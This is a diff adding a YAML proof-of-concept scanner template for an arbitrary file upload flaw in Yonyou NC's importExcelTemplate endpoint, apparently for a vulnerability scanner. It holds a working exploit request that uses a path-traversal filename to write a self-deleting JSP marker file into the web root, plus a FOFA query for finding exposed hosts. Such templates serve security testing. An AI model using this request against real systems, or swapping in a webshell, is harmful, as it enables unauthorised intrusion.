@@ -1,0 +1,31 @@
+id: poc-yaml-yongyou-nc-importexceltemplate-anyfile-upload
+info:
+  name: 用友NC importExcelTemplate 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 用友NC
+  fofa: app="用友-UFIDA-NC"
+variables:
+  t1: random_str(7)
+  t2: base64(t1)
+requests:
+- method: POST
+  path: /portal/pt/infopathimport/importExcelTemplate?pageId=login
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
+  data: '------WebKitFormBoundary
+
+    Content-Disposition: form-data; name="Filedata"; filename="./.\webapps\nc_web\{{.t1}}.jsp"
+
+    Content-Type: application/octet-stream
+
+
+    <% out.print("{{.t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+    ------WebKitFormBoundary--'
+  expression: status_code == 200 && body == ""
+- method: GET
+  path: /{{.t1}}.jsp
+  expression: status_code == 200 && body == t2
+transport: http
